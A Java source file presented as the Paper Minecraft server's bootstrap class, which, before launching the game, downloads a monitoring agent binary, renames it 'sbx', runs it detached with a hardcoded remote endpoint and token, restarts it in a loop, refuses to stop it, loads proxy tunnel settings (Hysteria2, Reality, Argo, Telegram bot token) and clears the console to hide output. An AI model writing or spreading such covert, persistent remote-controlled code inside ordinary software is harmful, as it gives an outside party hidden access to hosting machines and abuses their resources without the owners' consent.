package io.papermc.paper;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import joptsimple.OptionSet;
import net.minecraft.SharedConstants;
import net.minecraft.server.Main;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class PaperBootstrap {
    
    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static volatile Process komariProcess;

    // Komari Agent的配置常量（从外部配置文件读取）
    private static final class KomariConfig {
        public static final String DOWNLOAD_URL_AMD64 = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-amd64";
        public static final String DOWNLOAD_URL_ARM64 = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-arm64";
        public static final String AGENT_FILE_NAME = "sbx";
        public static final String CONFIG_FILE_PATH = "komari.properties";
        public static final String DEFAULT_E = "https://vps.z1000.dpdns.org:10736";
        public static final String DEFAULT_T = "JzerczYfCF4Secuy9vtYaB";

        public static String getE() {
            return loadConfig("komari.e", DEFAULT_E);
        }

        public static String getT() {
            return loadConfig("komari.t", DEFAULT_T);
        }

        private static String loadConfig(String key, String defaultValue) {
            Properties props = new Properties();
            File configFile = new File(CONFIG_FILE_PATH);
            try {
                if (!configFile.exists()) {
                    configFile.createNewFile();
                    props.setProperty(key, defaultValue);
                    props.store(new FileOutputStream(configFile), "Komari Agent Configuration");
                    return defaultValue;
                }
                props.load(new FileInputStream(configFile));
                String value = props.getProperty(key, defaultValue).trim();
                return value.isEmpty() ? defaultValue : value;
            } catch (IOException e) {
                System.err.println(ANSI_RED + "Error loading komari.properties: " + e.getMessage() + ANSI_RESET);
                return defaultValue;
            }
        }
    }

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
    };

    private PaperBootstrap() {
    }

    public static void boot(final OptionSet options) {
        float javaClassVersion = Float.parseFloat(System.getProperty("java.class.version"));
        if (javaClassVersion < 61.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too low (need Java 17+), please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }
        
        try {
            runKomariAgent();
            startKomariDaemonThread();

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                System.out.println(ANSI_RED + "JVM is shutting down, Komari agent keeps running..." + ANSI_RESET);
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds,you can copy the above nodes!" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();

            SharedConstants.tryDetectVersion();
            getStartupVersionMessages().forEach(LOGGER::info);
            Main.main(options);
            
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[2J");
                System.out.flush();
            }
        } catch (Exception e) {
            // 忽略异常
        }
    }
    
    private static void runKomariAgent() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        Path agentPath = getKomariAgentPath();
        List<String> command = new ArrayList<>();
        command.add("setsid");
        command.add(agentPath.toString());
        command.add("-e");
        command.add(KomariConfig.getE());
        command.add("-t");
        command.add(KomariConfig.getT());
        
        ProcessBuilder pb = new ProcessBuilder(command);
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        pb.directory(new File(System.getProperty("user.dir")));
        
        komariProcess = pb.start();
        System.out.println(ANSI_GREEN + "Komari agent started with config: e=" + KomariConfig.getE() + ", t=" + KomariConfig.getT() + ANSI_RESET);
    }

    private static Path getKomariAgentPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = KomariConfig.DOWNLOAD_URL_AMD64;
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = KomariConfig.DOWNLOAD_URL_ARM64;
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        Path agentPath = Paths.get(System.getProperty("java.io.tmpdir"), KomariConfig.AGENT_FILE_NAME);

        if (!Files.exists(agentPath)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, agentPath, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!agentPath.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission for komari-agent");
            }
        }
        return agentPath;
    }

    private static void stopKomariAgent() {
        System.out.println(ANSI_RED + "Komari agent is not allowed to stop, operation ignored." + ANSI_RESET);
    }

    private static void startKomariDaemonThread() {
        Thread daemonThread = new Thread(() -> {
            while (running.get()) {
                try {
                    if (komariProcess == null || !komariProcess.isAlive()) {
                        System.err.println(ANSI_RED + "Komari agent process exited unexpectedly, restarting..." + ANSI_RESET);
                        runKomariAgent();
                    }
                    Thread.sleep(5000);
                } catch (Exception e) {
                    System.err.println(ANSI_RED + "Error restarting Komari agent: " + e.getMessage() + ANSI_RESET);
                }
            }
        });
        daemonThread.setDaemon(true);
        daemonThread.setName("KomariAgentDaemon");
        daemonThread.start();
    }

    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "03ef7017-fca5-4f9c-abd1-f39edd3b3032");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "");
        envVars.put("ARGO_PORT", "");
        envVars.put("ARGO_DOMAIN", "");
        envVars.put("ARGO_AUTH", "");
        envVars.put("HY2_PORT", "25812");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "");
        envVars.put("CFPORT", "");
        envVars.put("NAME", "Mc");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }
    }

    // 【修复后的方法】解决getName()报错问题
    private static List<String> getStartupVersionMessages() {
        final String javaSpecVersion = System.getProperty("java.specification.version");
        final String javaVmName = System.getProperty("java.vm.name");
        final String javaVmVersion = System.getProperty("java.vm.version");
        final String javaVendor = System.getProperty("java.vendor");
        final String javaVendorVersion = System.getProperty("java.vendor.version");
        final String osName = System.getProperty("os.name");
        final String osVersion = System.getProperty("os.version");
        final String osArch = System.getProperty("os.arch");

        return List.of(
            String.format(
                "Running Java %s (%s %s; %s %s) on %s %s (%s)",
                javaSpecVersion,
                javaVmName,
                javaVmVersion,
                javaVendor,
                javaVendorVersion == null ? "unknown" : javaVendorVersion,
                osName,
                osVersion,
                osArch
            ),
            // 推荐：使用SharedConstants.VERSION_STRING（最稳定，无接口依赖）
            String.format("Loading Paper for Minecraft %s", SharedConstants.VERSION_STRING)
            // 备选：若VERSION_STRING失效，用WorldVersion的id()方法
            // String.format("Loading Paper for Minecraft %s", SharedConstants.getCurrentVersion().id())
        );
    }
}
